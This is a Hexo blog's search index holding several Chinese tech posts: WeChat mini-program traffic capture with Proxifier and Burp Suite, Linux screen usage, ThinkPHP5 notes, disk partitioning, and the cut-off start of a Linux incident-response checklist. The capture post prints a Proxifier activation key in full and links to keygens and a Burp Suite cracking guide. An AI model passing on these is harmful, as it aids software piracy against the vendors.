<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2024/10/22/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>一种测试微信小程序的抓包方法</title>
    <url>/2024/10/22/%E4%B8%80%E7%A7%8D%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ol>
<li>系统Microsoft Windows [版本 10.0.19045.5011]</li>
<li>微信 [版本 3.9.11.25]</li>
<li>proxifier [版本 4.03 x64]</li>
<li>burpsuite[版本 Professional 2024.8.4]</li>
<li>everything</li>
</ol>
<h2 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h2><ol>
<li>安装好微信。<a href="https://pc.weixin.qq.com/">微信下载地址</a></li>
<li>安装好proxifier，输入激活码：CLOT5-J3GYK-VGPYE-BDPMN-WKWMU（也可以用注册机自己生成：<a href="https://github.com/y9nhjy/Proxifier-Keygen">注册机下载地址</a>）</li>
<li>安装burpsuite，<a href="https://portswigger.net/burp/releases">burpsuite下载地址</a>，<a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen">注册机下载地址</a>。安装及破解详细教学地址：<a href="https://www.sqlsec.com/2020/10/winbp.html">burpsuite安装及破解</a></li>
</ol>
<h2 id="配置proxifier"><a href="#配置proxifier" class="headerlink" title="配置proxifier"></a>配置proxifier</h2><ol>
<li>配置代理服务器为burpsuite，进入proxifier，找到如下选项</li>
</ol>
<p><img src="/../images/%E4%B8%80%E7%A7%8D%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95/image-20241022155637177.png" alt="image-20241022155637177"></p>
<ol start="2">
<li>点击“add”添加“Proxy Server”</li>
</ol>
<p><img src="/../images/%E4%B8%80%E7%A7%8D%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95/image-20241022155940152.png" alt="image-20241022155940152"></p>
<ol start="3">
<li>本文章，默认您的burpsuite开启监听的端口是127.0.0.1:8080，所以添加server配置如下图：</li>
</ol>
<p><img src="/../images/%E4%B8%80%E7%A7%8D%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95/image-20241022160216298.png" alt="image-20241022160216298"></p>
<ol start="4">
<li>可以点击下方“Check”按钮，确认代理服务器是否能成功连通。</li>
</ol>
<p><img src="/../images/%E4%B8%80%E7%A7%8D%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95/image-20241022160514252.png" alt="image-20241022160514252"></p>
<p>如果连通，则显示绿色“Proxy is ready to work with Proxifier!”，如下图。</p>
<p><strong>注意：默认测试连通访问的是<a href="www.google.com">谷歌</a>，如果您未进行科学上网，可能会测试连通性失败，请在右上角“Test Settings”处，改成<a href="www.baidu.com">百度</a></strong></p>
<p><img src="/../images/%E4%B8%80%E7%A7%8D%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95/image-20241022160621456.png" alt="image-20241022160621456"></p>
<p><img src="/../images/%E4%B8%80%E7%A7%8D%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95/image-20241022160915957.png" alt="image-20241022160915957"></p>
<ol start="5">
<li>配置代理规则，找到下图选项卡</li>
</ol>
<p><img src="/../images/%E4%B8%80%E7%A7%8D%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95/image-20241022161340939.png" alt="image-20241022161340939"></p>
<ol start="6">
<li>点击“Add”添加一条规则，“Applications”选择“wechatappex.exe”，这个程序是windows版微信小程序的exe，如果您不知道这个程序路径在哪里，可以使用everything程序进行全局搜索，<a href="https://www.voidtools.com/zh-cn/">everything下载地址</a>。</li>
</ol>
<p><img src="/../images/%E4%B8%80%E7%A7%8D%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95/image-20241022162413616.png" alt="image-20241022162413616"></p>
<p>“Action”选择我们之前创建好的代理服务器“Proxy HTTPS 127.0.0.1”</p>
<p><img src="/../images/%E4%B8%80%E7%A7%8D%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95/image-20241022161758371.png" alt="image-20241022161758371"></p>
<p><img src="/../images/%E4%B8%80%E7%A7%8D%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95/image-20241022161704234.png" alt="image-20241022161704234"></p>
<h2 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h2><ol>
<li><p>打开windows版微信，点开任意小程序，测试抓包情况。</p>
</li>
<li><p>打开burpsuite。切换到“Proxy”选项卡中的“HTTP history”选项卡，可以看到成功抓到小程序数据包。</p>
</li>
</ol>
<p><img src="/../images/%E4%B8%80%E7%A7%8D%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95/image-20241022163156601.png" alt="image-20241022163156601"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ol>
<li>关于不能抓到https数据包的问题。访问：<a href="http://burp/">burp证书下载地址</a>下载证书，并导入“受信任的根证书颁发机构”，可以用“mmc”控制台管理单元添加，相关细节不再赘述。</li>
<li>关于能否用“Proxifier”抓取安卓模拟器数据包，还在测试。</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>burp使用</tag>
        <tag>小程序抓包</tag>
        <tag>proxifier</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-screen命令使用详解</title>
    <url>/2024/10/23/linux-screen%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="screen命令"><a href="#screen命令" class="headerlink" title="screen命令"></a>screen命令</h1><h2 id="创建一个新的窗口"><a href="#创建一个新的窗口" class="headerlink" title="创建一个新的窗口"></a>创建一个新的窗口</h2><p>screen -S test</p>
<h2 id="列出所有窗口"><a href="#列出所有窗口" class="headerlink" title="列出所有窗口"></a>列出所有窗口</h2><p>screen -ls</p>
<h2 id="重新回到窗口"><a href="#重新回到窗口" class="headerlink" title="重新回到窗口"></a>重新回到窗口</h2><p>screen -r test</p>
<h2 id="清除dead会话"><a href="#清除dead会话" class="headerlink" title="清除dead会话"></a>清除dead会话</h2><p>screen -list会显示该会话为dead状态<br>使用screen -wipe命令清除该会话</p>
<h2 id="远程detach某个session"><a href="#远程detach某个session" class="headerlink" title="远程detach某个session"></a>远程detach某个session</h2><p>screen -d test</p>
<h2 id="上翻命令"><a href="#上翻命令" class="headerlink" title="上翻命令"></a>上翻命令</h2><p>同时按ctrl+a+[</p>
<h2 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen [-AmRvx -ls -wipe][-d &lt;作业名称&gt;][-h &lt;行数&gt;][-r &lt;作业名称&gt;][-s ][-S &lt;作业名称&gt;]</span><br><span class="line"></span><br><span class="line">-A 　将所有的视窗都调整为目前终端机的大小。</span><br><span class="line">-d &lt;作业名称&gt; 　将指定的screen作业离线。</span><br><span class="line">-h &lt;行数&gt; 　指定视窗的缓冲区行数。</span><br><span class="line">-m 　即使目前已在作业中的screen作业，仍强制建立新的screen作业。</span><br><span class="line">-r &lt;作业名称&gt; 　恢复离线的screen作业。</span><br><span class="line">-R 　先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。</span><br><span class="line">-s 　指定建立新视窗时，所要执行的shell。</span><br><span class="line">-S &lt;作业名称&gt; 　指定screen作业的名称。</span><br><span class="line">-v 　显示版本信息。</span><br><span class="line">-x 　恢复之前离线的screen作业。</span><br><span class="line">-ls或--list 　显示目前所有的screen作业。</span><br><span class="line">-wipe 　检查目前所有的screen作业，并删除已经无法使用的screen作业。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>常用命令详解</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>screen</tag>
      </tags>
  </entry>
  <entry>
    <title>文本去重复小工具</title>
    <url>/2024/10/23/%E6%96%87%E6%9C%AC%E5%8E%BB%E9%87%8D%E5%A4%8D%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><p><a href="https://h4ckforjob.github.io/rmre.html">文本去重复</a></p>
]]></content>
      <categories>
        <category>web工具</category>
      </categories>
      <tags>
        <tag>小工具</tag>
        <tag>去重复</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo-next主题文章浏览次数添加单位</title>
    <url>/2024/10/23/hexo-next%E4%B8%BB%E9%A2%98%E6%96%87%E7%AB%A0%E6%B5%8F%E8%A7%88%E6%AC%A1%E6%95%B0%E6%B7%BB%E5%8A%A0%E5%8D%95%E4%BD%8D/</url>
    <content><![CDATA[<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ol>
<li>hexo版本：7.3.0</li>
<li>next版本：5.1.4</li>
</ol>
<h2 id="效果预览"><a href="#效果预览" class="headerlink" title="效果预览"></a>效果预览</h2><p>实现浏览次数的单位显示，效果如图</p>
<p><img src="/../images/hexo-next%E4%B8%BB%E9%A2%98%E6%96%87%E7%AB%A0%E6%B5%8F%E8%A7%88%E6%AC%A1%E6%95%B0%E6%B7%BB%E5%8A%A0%E5%8D%95%E4%BD%8D/image-20241023171312372.png" alt="image-20241023171312372"></p>
<h2 id="定位前端代码"><a href="#定位前端代码" class="headerlink" title="定位前端代码"></a>定位前端代码</h2><p>在浏览器中，同时按下Ctrl+Shift+c，选择前端图标元素，找到关键字。</p>
<p><img src="/../images/hexo-next%E4%B8%BB%E9%A2%98%E6%96%87%E7%AB%A0%E6%B5%8F%E8%A7%88%E6%AC%A1%E6%95%B0%E6%B7%BB%E5%8A%A0%E5%8D%95%E4%BD%8D/image-20241023171557749.png" alt="image-20241023171557749"></p>
<p>可以看到关键字是“fa fa-file-o”</p>
<p>在博客根目录搜索关键字，推荐使用vs code打开博客项目搜索，搜索结果如图。</p>
<p><img src="/../images/hexo-next%E4%B8%BB%E9%A2%98%E6%96%87%E7%AB%A0%E6%B5%8F%E8%A7%88%E6%AC%A1%E6%95%B0%E6%B7%BB%E5%8A%A0%E5%8D%95%E4%BD%8D/image-20241023171748595.png" alt="image-20241023171748595"></p>
<p>可以了解到页面统计是“page_pv_header”变量控制的。继续搜索“page_pv_header”变量。</p>
<p><img src="/../images/hexo-next%E4%B8%BB%E9%A2%98%E6%96%87%E7%AB%A0%E6%B5%8F%E8%A7%88%E6%AC%A1%E6%95%B0%E6%B7%BB%E5%8A%A0%E5%8D%95%E4%BD%8D/image-20241023171906996.png" alt="image-20241023171906996"></p>
<p>找到最终代码在“post.swig”文件中。</p>
<h2 id="实现单位添加"><a href="#实现单位添加" class="headerlink" title="实现单位添加"></a>实现单位添加</h2><p>修改<code>&lt;span class=&quot;busuanzi-value&quot; id=&quot;busuanzi_value_page_pv&quot; &gt;&lt;/span&gt;</code>代码段前后。就可以实现文章浏览次数单位的添加。</p>
<p><img src="/../images/hexo-next%E4%B8%BB%E9%A2%98%E6%96%87%E7%AB%A0%E6%B5%8F%E8%A7%88%E6%AC%A1%E6%95%B0%E6%B7%BB%E5%8A%A0%E5%8D%95%E4%BD%8D/image-20241023172059517.png" alt="image-20241023172059517"></p>
]]></content>
      <categories>
        <category>hexo博客搭建相关</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp5框架学习-访问自定义方法</title>
    <url>/2024/10/29/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol>
<li>安装phpstudy，版本8.1.1.2，启动Apache2.4.39。</li>
<li>安装composer1.8.5。</li>
</ol>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029155119237.png" alt="image-20241029155119237"></p>
<ol start="3">
<li>配置系统环境变量。当前php路径：D:\phpstudy_pro\Extensions\php\php5.5.9nts\php.exe，当前composer路径：D:\phpstudy_pro\Extensions\composer1.8.5\composer.bat</li>
</ol>
<p>因此添加以下两个路径到系统环境变量，这样就能在cmd中执行composer命令了<br><code>D:\phpstudy_pro\Extensions\php\php5.5.9nts\</code><br><code>D:\phpstudy_pro\Extensions\composer1.8.5\</code></p>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029160426862.png" alt="image-20241029160426862"></p>
<ol start="4">
<li>composer全局配置阿里云源。执行以下命令换源。</li>
</ol>
<p><code>composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</code></p>
<ol start="5">
<li>使用composer安装thinkphp5框架。</li>
</ol>
<p>cd到phpstudy的web根目录。我的web根目录是D:\phpstudy_pro\WWW</p>
<p>执行以下命令开始安装，并将框架目录名命名为think_composer。</p>
<p><code>composer create-project --prefer-dist topthink/think think_composer</code></p>
<p>安装成功的话，应该如图所示。</p>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029161101169.png" alt="image-20241029161101169"></p>
<h2 id="测试访问"><a href="#测试访问" class="headerlink" title="测试访问"></a>测试访问</h2><p>访问<a href="http://localhost/think_composer/public/">http://localhost/think_composer&#x2F;public&#x2F;</a>如果一切配置正常，你会看到如下图界面。其中public文件夹为thinkphp5的web根目录。</p>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029161258968.png" alt="image-20241029161258968"></p>
<h2 id="添加自定义方法"><a href="#添加自定义方法" class="headerlink" title="添加自定义方法"></a>添加自定义方法</h2><p>那么如何添加自定义的方法呢？</p>
<p>测试修改代码，在application目录下，找到控制器index，添加test方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的意思是访问到test方法，就返回phpinfo信息。</p>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029161818286.png" alt="image-20241029161818286"></p>
<h2 id="访问自定义方法"><a href="#访问自定义方法" class="headerlink" title="访问自定义方法"></a>访问自定义方法</h2><p>接下来就是访问自定义方法。</p>
<p>可以通过以下路径访问到自定义方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/think_composer/public/index.php?s=/index/index/test</span><br><span class="line">http://localhost/think_composer/public/index.php/index/index/test</span><br></pre></td></tr></table></figure>

<p>成功访问，如图所示。</p>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029162329771.png" alt="image-20241029162329771"></p>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029162436115.png" alt="image-20241029162436115"></p>
<h2 id="未解决的问题"><a href="#未解决的问题" class="headerlink" title="未解决的问题"></a>未解决的问题</h2><h3 id="问题一：访问不到自定义方法。"><a href="#问题一：访问不到自定义方法。" class="headerlink" title="问题一：访问不到自定义方法。"></a>问题一：访问不到自定义方法。</h3><p>通过以下路径访问不到自定义方法。返回<code>No input file specified.</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/think_composer/public/index/index/index/test</span><br></pre></td></tr></table></figure>

<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029162729018.png" alt="image-20241029162729018"></p>
<p>猜测的原因是未正确配置<code>.htaccess</code>文件。我当前的配置内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
<p>搜索出来的文章说可能有两个原因。1.路由配置问题。2.thinkphp框架解析路径出现问题。<a href="https://blog.csdn.net/qq5201314wx/article/details/118540380">https://blog.csdn.net/qq5201314wx/article/details/118540380</a></p>
<p>慕课网用户给出的解决方案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要设置你的站点伪静态，打开public-.htaccess</span><br><span class="line"></span><br><span class="line">把：RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]</span><br><span class="line"></span><br><span class="line">改成：RewriteRule ^(.*)$ index.php?/$1 [QSA,PT,L]</span><br><span class="line"></span><br><span class="line">就可以了</span><br></pre></td></tr></table></figure>

<p>尝试修改配置之后还是返回<code>No input file specified.</code>。</p>
<p>最后修改配置成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  RewriteRule ^(.*)$ index.php?s=/$1 [QSA,PT,L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>再访问<code>http://localhost/think_composer/public/index/index/index</code>就正常了</p>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241030143845017.png" alt="image-20241030143845017"></p>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241030143920299.png" alt="image-20241030143920299"></p>
<h3 id="问题二：访问不到其他控制器的方法"><a href="#问题二：访问不到其他控制器的方法" class="headerlink" title="问题二：访问不到其他控制器的方法"></a>问题二：访问不到其他控制器的方法</h3><p>创建admin控制器，添加index方法。</p>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029164054888.png" alt="image-20241029164054888"></p>
<p>预期结果是访问以下两个路径，返回”this is admin Index index“。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/think_composer/public/index.php?s=/admin/index/index</span><br><span class="line">http://localhost/think_composer/public/index.php/admin/index/index</span><br></pre></td></tr></table></figure>

<p>但实际访问报错如图。</p>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029164430785.png" alt="image-20241029164430785"></p>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029164454118.png" alt="image-20241029164454118"></p>
<p>目前还没找到原因，先继续学习thinkphp5框架后续课程了。</p>
<p>更新，发现原来是Index.php的i没大写，导致找不到控制器。</p>
<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029180500309.png" alt="image-20241029180500309"></p>
<p>现在访问以下路径，能看到”this is admin Index index“了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/think_composer/public/index.php?s=/admin/index/index</span><br><span class="line">http://localhost/think_composer/public/index.php/admin/index/index</span><br></pre></td></tr></table></figure>

<p><img src="/../images/thinkphp5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E8%AE%BF%E9%97%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%B9%E6%B3%95/image-20241029180843357.png" alt="image-20241029180843357"></p>
]]></content>
      <categories>
        <category>php开发</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>使用傲梅分区助手扩大c盘</title>
    <url>/2025/04/10/%E4%BD%BF%E7%94%A8%E5%82%B2%E6%A2%85%E5%88%86%E5%8C%BA%E5%8A%A9%E6%89%8B%E6%89%A9%E5%A4%A7c%E7%9B%98/</url>
    <content><![CDATA[<h2 id="查看分区情况"><a href="#查看分区情况" class="headerlink" title="查看分区情况"></a>查看分区情况</h2><p>目前磁盘1有c盘和d盘，目标是将d盘中的350g空间，扩容到c盘<br><img src="/../images/%E4%BD%BF%E7%94%A8%E5%82%B2%E6%A2%85%E5%88%86%E5%8C%BA%E5%8A%A9%E6%89%8B%E6%89%A9%E5%A4%A7c%E7%9B%98/image-20250410150222623.png" alt="image-20250410150222623"></p>
<h2 id="调整d盘分区"><a href="#调整d盘分区" class="headerlink" title="调整d盘分区"></a>调整d盘分区</h2><p>划分分区大小，腾出350g左右的未分配空间</p>
<p><img src="/../images/%E4%BD%BF%E7%94%A8%E5%82%B2%E6%A2%85%E5%88%86%E5%8C%BA%E5%8A%A9%E6%89%8B%E6%89%A9%E5%A4%A7c%E7%9B%98/image-20250410151014784.png" alt="image-20250410151014784"></p>
<h2 id="调整c盘分区"><a href="#调整c盘分区" class="headerlink" title="调整c盘分区"></a>调整c盘分区</h2><p>将未分配空间，全部加到c盘上</p>
<p><img src="/../images/%E4%BD%BF%E7%94%A8%E5%82%B2%E6%A2%85%E5%88%86%E5%8C%BA%E5%8A%A9%E6%89%8B%E6%89%A9%E5%A4%A7c%E7%9B%98/image-20250410151247799.png" alt="image-20250410151247799"></p>
<p>预览下效果</p>
<p><img src="/../images/%E4%BD%BF%E7%94%A8%E5%82%B2%E6%A2%85%E5%88%86%E5%8C%BA%E5%8A%A9%E6%89%8B%E6%89%A9%E5%A4%A7c%E7%9B%98/image-20250410151313608.png" alt="image-20250410151313608"></p>
<h2 id="提交操作"><a href="#提交操作" class="headerlink" title="提交操作"></a>提交操作</h2><p>点击左上角提交操作，在弹出的窗口中，再点击执行</p>
<p><img src="/../images/%E4%BD%BF%E7%94%A8%E5%82%B2%E6%A2%85%E5%88%86%E5%8C%BA%E5%8A%A9%E6%89%8B%E6%89%A9%E5%A4%A7c%E7%9B%98/image-20250410151409097.png" alt="image-20250410151409097"></p>
<h2 id="等待重启进入pe模式自动调整分区"><a href="#等待重启进入pe模式自动调整分区" class="headerlink" title="等待重启进入pe模式自动调整分区"></a>等待重启进入pe模式自动调整分区</h2><p><img src="/../images/%E4%BD%BF%E7%94%A8%E5%82%B2%E6%A2%85%E5%88%86%E5%8C%BA%E5%8A%A9%E6%89%8B%E6%89%A9%E5%A4%A7c%E7%9B%98/1e59602a9dad3327050e239c2d3f3cd.jpg" alt="1e59602a9dad3327050e239c2d3f3cd"><br>分区调整完成后自动重启，进入系统查看c盘，已经成功扩容到500g，d盘原有的数据也还在，非常好！<br><img src="/../images/%E4%BD%BF%E7%94%A8%E5%82%B2%E6%A2%85%E5%88%86%E5%8C%BA%E5%8A%A9%E6%89%8B%E6%89%A9%E5%A4%A7c%E7%9B%98/image-20250410153211541.png" alt="image-20250410153211541"></p>
]]></content>
      <tags>
        <tag>分区助手</tag>
        <tag>c盘扩容</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应-Linux场景checklist</title>
    <url>/2025/07/04/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%9C%BA%E6%99%AFchecklist/</url>
    <content><![CDATA[<h2 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h2><ol>
<li>创建临时目录，存储分析记录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /tmp/work/</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>打包日志文件，防止后续操作覆盖</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tar -zcvf /tmp/work/log.tar.gz /var/log/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>备份历史命令再进行分析，防止覆盖（显示命令执行时间）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export HISTTIMEFORMAT=&#x27;%F %T &#x27; ;history &gt; /tmp/work/history.txt</span><br><span class="line">cat /root/.bash_history &gt; /tmp/work/bash_history.txt</span><br></pre></td></tr></table></figure>

<ol start="4">
